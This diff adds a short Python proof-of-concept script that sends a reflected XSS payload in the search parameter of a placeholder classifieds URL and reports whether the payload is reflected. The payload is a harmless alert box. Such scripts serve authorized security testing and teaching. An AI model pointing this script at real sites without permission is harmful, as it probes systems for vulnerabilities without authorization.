@@ -1,0 +1,22 @@
+import requests
+
+# Configuration
+target_url = "http://example.com/classifieds"  # Change this to the target site's URL
+payload = "<script>alert('XSS')</script>"  # XSS payload
+
+def trigger_xss():
+    # Construct the malicious URL
+    malicious_url = f"{target_url}?search={payload}"
+
+    # Send a GET request to the malicious URL
+    response = requests.get(malicious_url)
+
+    # Check if the payload is reflected in the response
+    if payload in response.text:
+        print("[+] XSS payload reflected in the response.")
+        print("[+] Malicious URL:", malicious_url)
+    else:
+        print("[-] XSS payload not reflected in the response.")
+
+if __name__ == "__main__":
+    trigger_xss()
